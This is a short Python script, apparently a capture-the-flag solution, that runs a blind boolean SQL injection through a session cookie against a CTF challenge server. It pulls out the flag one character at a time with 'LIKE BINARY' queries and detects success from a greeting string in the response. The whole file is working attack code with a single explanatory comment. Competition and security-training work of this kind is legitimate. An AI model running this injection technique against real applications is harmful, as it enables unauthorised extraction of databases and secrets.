import sys
import string
import requests

# Demonstration of SQL injection using vulnerable cookie

flag = ""
c = ""
url = "http://tasks.ctfd.kncyber.pl:7014/"
print("[+] working")
while c != "}":
    for c in "{" + "}" + string.printable:
        if c == "%":  # means any substring
            continue
        query = "2ac50429607af2fcb34b2201a4abc9aa' AND  flag LIKE BINARY '" + flag + c + "%' -- '"
        r = requests.post(url, cookies={"sqool_session": query})
        if "Witaj" in r.text:
            flag += c
            sys.stdout.write('\033[2K\033[1G')
            sys.stdout.write("\rcurrent status: " + flag)
            break

print("\n[+] flag:", flag)
